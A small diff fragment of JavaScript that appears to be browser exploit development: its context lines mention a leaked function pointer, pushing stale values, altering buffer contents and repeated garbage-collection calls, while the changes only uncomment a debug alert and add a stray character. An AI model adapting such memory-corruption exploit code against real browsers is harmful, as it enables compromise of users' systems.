@@ -168,7 +168,7 @@ for (var i = 0; i < 0x1000; i++){
 				//alert("Leaked function pointer:" + fcp)
 				
                        		
-				//alert("Pushed stale");
+				alert("Pushed stale");
 				//var original_val = bufs[i][k];
 				//var original_val1 = bufs[i][k+1];
 				
@@ -203,7 +203,7 @@ for (var i = 0; i < 0x1000; i++){
 				bufs[i][k] += 0x10;
 				
 				/*
-				dgc();
+				dgc();a
 				dgc();
 				dgc();
 				dgc();
